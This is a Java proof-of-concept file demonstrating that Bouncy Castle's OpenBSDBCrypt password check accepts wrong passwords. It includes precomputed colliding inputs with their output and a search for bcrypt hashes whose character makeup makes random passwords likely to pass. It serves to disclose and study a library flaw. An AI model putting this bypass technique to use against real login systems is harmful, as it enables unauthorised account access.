package org.example;

import org.bouncycastle.crypto.generators.OpenBSDBCrypt;
import org.bouncycastle.jce.provider.BouncyCastleProvider;
import org.bouncycastle.util.encoders.Hex;

import java.nio.charset.StandardCharsets;
import java.security.*;
import java.util.*;

import static org.bouncycastle.crypto.generators.OpenBSDBCrypt.checkPassword;

class HashPlain{
    String hash;
    byte[] salt;
    char[] plain;
    HashPlain(String _hash, char[] _plain, byte[] _salt){
        hash = _hash;
        plain = _plain;
        salt = _salt;
    }
}

public class Main {

    public static void main(String[] args) throws NoSuchAlgorithmException {

        var prePlainText = "-378494392".toCharArray();
        var preHash = "$2a$10$603j/YReRMYwmT7T9mUI5uioFPV3Hv/NAom0eoBNtWeX6mVLrrGHe";
        var preSalt = Hex.decode("f36e6505a4e04ce6b2a15f55fe858aef");

        System.out.println("pre calculated PoC :) start ---");
        String[] preTargets = {"0123456",
                "-1913638162",
                "2014816207",
                "458420093"
        };

        for(var target: preTargets){
            System.out.println(preHash);
            System.out.println(OpenBSDBCrypt.generate("2a", target.toCharArray(), preSalt, 10));
            System.out.println(checkPassword(preHash, target.toCharArray())); // => false
        }
        System.out.println("pre calculated PoC :) end ---");
        /*
            pre calculated PoC :) start ---
            $2a$10$603j/YReRMYwmT7T9mUI5uioFPV3Hv/NAom0eoBNtWeX6mVLrrGHe
            $2a$10$603j/YReRMYwmT7T9mUI5uCkUqdVL777qPDa4dQpDjH7yVrnLa/fa
            false
            $2a$10$603j/YReRMYwmT7T9mUI5uioFPV3Hv/NAom0eoBNtWeX6mVLrrGHe
            $2a$10$603j/YReRMYwmT7T9mUI5uIw3ZR3q50in0nUpxSGt0uqysWtfoGIe
            true
            $2a$10$603j/YReRMYwmT7T9mUI5uioFPV3Hv/NAom0eoBNtWeX6mVLrrGHe
            $2a$10$603j/YReRMYwmT7T9mUI5uzlEL5kLYJAxmiLkjGEayWFHVoGtrXky
            true
            $2a$10$603j/YReRMYwmT7T9mUI5uioFPV3Hv/NAom0eoBNtWeX6mVLrrGHe
            $2a$10$603j/YReRMYwmT7T9mUI5uXy/1gXBEzXnFkoPdwD/nOUmBvjjIPTu
            true
         */

        var secureRandom = new SecureRandom();
        var random = new Random();

        Boolean[] hit = new Boolean[256];
        Arrays.fill(hit, false);
        for(char c='0';c<='9';++c){
            hit[c] = true;
        }
        hit['.'] = true;
        hit['/'] = true;
        var results = new TreeMap<Double, HashPlain>();

        for(int counter=0;counter<100;counter++) {
            System.out.println(counter);
            int variableCnt = 52;

            byte[] salt = new byte[16];
            secureRandom.nextBytes(salt);
            char[] password = String.valueOf(random.nextInt()).toCharArray();
            var hash = OpenBSDBCrypt.generate("2a", password, salt, 10);
            // できた中で一番すごいハッシュ値 60%くらいある: var hash = "$2a$10$7/9fom693ChLa0Q.SN8Y5uddANx6SgM9jzheLNp5WjtTvbVKeGaD.";

            // ハッシュ値の評価
            Double cnt = 1.0;
            Integer hoge = 0;
            var memo = hit.clone();
            for(int i=0;i<hash.length();++i){
                var c = hash.charAt(i);
                if(memo[c]) {
                    variableCnt++;
                    memo[c] = false;
                }
                else {
                    if (i >= 29) {
                        cnt *= variableCnt;
                        ++hoge;
                    }
                }
            }

            Double prob = cnt / Math.pow(64,31);
            results.put(prob, new HashPlain(hash, password, salt));
        }

        // 最後の要素を取り出し
        var target = "";
        char[] targetPlain = "error".toCharArray();
        for(var key: results.keySet()){
            var hashPlain = results.get(key);
            System.out.println("-----");
            System.out.println("prob: " + key.toString());
            System.out.println("hash: " + hashPlain.hash);
            System.out.println("salt: " + new String(Hex.encode(hashPlain.salt)));
            System.out.println("plaintext: " + new String(hashPlain.plain));
            target = hashPlain.hash;
            targetPlain = hashPlain.plain;
        }

        System.out.println("====================");
        System.out.println("targethash: " + target);
        System.out.println("targetPlain: " + new String(targetPlain));

        var cnt = 0;
        var challengeCnt = 100;
        for(int counter=0;counter<challengeCnt;counter++) {
            System.out.println(counter);
            char[] password = String.valueOf(random.nextInt()).toCharArray();
            var result = OpenBSDBCrypt.checkPassword(target, password);
            System.out.println("challenge: " + new String(password));
            System.out.println("result: " + result);
            if(result) cnt++;
        }
        System.out.println("success: " + cnt);
        System.out.println("challenge: " + challengeCnt);
    }

    
}
